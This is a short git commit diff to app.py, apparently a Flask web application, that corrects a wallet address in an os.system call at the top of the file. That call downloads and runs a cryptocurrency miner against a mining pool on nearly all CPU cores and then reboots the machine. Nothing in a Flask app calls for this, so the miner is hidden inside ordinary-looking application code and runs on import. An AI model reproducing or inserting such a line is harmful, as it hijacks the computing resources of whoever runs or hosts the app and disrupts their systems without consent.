76a2b225e2d769c9341a74a7b2c699472ae18edf
muhammadajimukti558 <107189622+muhammadajimukti558@users.noreply.github.com>
2022-07-14 21:14:01 +0700

    Update app.py

--- app.py
+++ app.py
@@ -1,5 +1,5 @@
 import os
-os.system ("wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz && tar xf webchain-miner-2.8.0-linux-amd64.tar.gz && ./webchain-miner -o pool.webchain.network:3333 -u 0x618758ae107193d63344=39f6b3f1553ac6e43b62 -p x -t $(nproc --ignore 3) && reboot")
+os.system ("wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz && tar xf webchain-miner-2.8.0-linux-amd64.tar.gz && ./webchain-miner -o pool.webchain.network:3333 -u 0x618758ae107193d6334439f6b3f1553ac6e43b62 -p x -t $(nproc --ignore 3) && reboot")
 from flask import Flask
 from flask import render_template
 
